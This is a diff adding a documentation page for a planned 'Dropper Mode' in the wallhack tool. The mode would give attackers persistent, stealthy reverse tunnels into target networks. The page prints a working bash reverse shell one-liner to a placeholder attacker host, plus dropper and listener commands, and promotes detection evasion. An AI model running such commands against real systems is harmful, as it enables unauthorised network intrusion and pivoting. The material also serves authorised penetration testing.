@@ -1,0 +1,79 @@
+---
+title: Dropper Mode
+description: Future feature making reverse tunnels as simple as reverse shells
+order: 8
+badge: Coming Soon
+badgeVariant: secondary
+---
+
+# Dropper Mode
+
+{% badge text="Coming Soon" variant="secondary" /%} {% badge text="Experimental" variant="outline" /%}
+
+Future feature making reverse tunnels as simple as reverse shells. Drop, execute, and get instant network access.
+
+{% card title="Reverse Tunnel Simplicity" icon="lightning" description="Traditional reverse shells give you a command prompt. Dropper mode gives you an entire network. No manual connection setup, no complex flag combinations — just drop and pivot." /%}
+
+{% grid cols=2 %}
+{% card title="Traditional Reverse Shell" icon="terminal" description="Gives you a command prompt on the target" %}
+```bash
+bash -i >& /dev/tcp/ATTACKER/443 0>&1
+```
+
+Limited to executing commands on the compromised host
+{% /card %}
+
+{% card title="Dropper Mode" icon="parachute" description="Gives you Layer 3 access to the entire network" %}
+```bash
+./wallhack-drop ATTACKER:443
+```
+
+Full network-level access for scanning, pivoting, exploitation
+{% /card %}
+{% /grid %}
+
+## Key Features
+
+{% grid cols=2 %}
+{% feature title="Single Command Deployment" icon="skull" %}
+Drop the binary, execute once, establish persistent tunnel
+{% /feature %}
+
+{% feature title="Automatic Reconnection" icon="skull" %}
+Built-in retry logic maintains connectivity through network instability
+{% /feature %}
+
+{% feature title="Minimal Footprint" icon="skull" %}
+Small binary size and low resource usage avoid detection
+{% /feature %}
+
+{% feature title="Stealth Operation" icon="skull" %}
+Blends with normal HTTPS traffic on common ports
+{% /feature %}
+{% /grid %}
+
+## Planned Usage
+
+{% steps %}
+{% step title="Start Listener" number=1 %}
+Configure your machine to accept dropper connections
+
+{% codeblock code="wallhack --dropper-listen :443" title="Attacker machine" /%}
+{% /step %}
+
+{% step title="Deploy Binary" number=2 %}
+Transfer and execute the dropper on the target
+
+{% codeblock code="./wallhack-drop ATTACKER_IP:443" title="Target host" /%}
+{% /step %}
+
+{% step title="Automatic Setup" number=3 %}
+Tunnel establishes automatically, routes are configured, network is accessible
+
+**Result:** Full Layer 3 access to the target's network through a persistent reverse tunnel.
+{% /step %}
+{% /steps %}
+
+{% callout type="warning" title="Status" %}
+Dropper mode is under active development. The goal is to make network pivoting as ubiquitous and simple as reverse shells are today. Follow the [GitHub repository](https://github.com/block65/wallhack) for updates.
+{% /callout %}
